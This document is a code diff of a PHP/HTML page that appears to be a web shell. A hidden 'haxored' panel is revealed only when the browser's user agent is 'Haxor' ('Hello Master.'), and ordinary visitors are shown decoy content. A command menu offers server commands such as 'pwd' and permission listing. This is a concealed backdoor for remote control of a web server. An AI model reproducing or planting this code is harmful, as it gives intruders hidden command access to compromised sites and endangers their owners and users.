@@ -4,17 +4,20 @@
 <!-- Don't include this jQuery API if it's already included on the site -->
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
 
-<div id="haxored" hidden="true" style='width: 100%; height: 100%; background-color: black'>
 <script type="text/javascript">
 	$(document).ready( function() {
 		if( navigator.userAgent == "Haxor" ) {
+			console.log("Hello Master.")
+			$("body").css({"margin":"0px"});
 			$("#haxored").prop("hidden", false);
 			$("#luserContent").remove();
 		} else {
+			console.log("#");	
 			$("#haxored").remove();
 		}
 	});
 </script>
+<div id="haxored" hidden="true" style='margin: 0px; padding: 0px; width: 100%; height: 100%; color: #fff; background-color: #161616;'>
 <?php
 	class UserInterface
 	{
@@ -66,7 +69,7 @@
 </style>
 <div id="Xcontainer">
 	<div id="XmenuNav">
-		<form action="#" id="XmenuForm">
+		<form action="" id="XmenuForm">
 		<ul class="XmenuOptions">
 			<li><button type="submit" form="XmenuForm" id="XbuttonPwd" name="command" value="pwd">PWD</div></li>
 			<li><button type="submit" form="XmenuForm" id="XbuttonPerm" name="command" value="perm">Permissions</div></li>
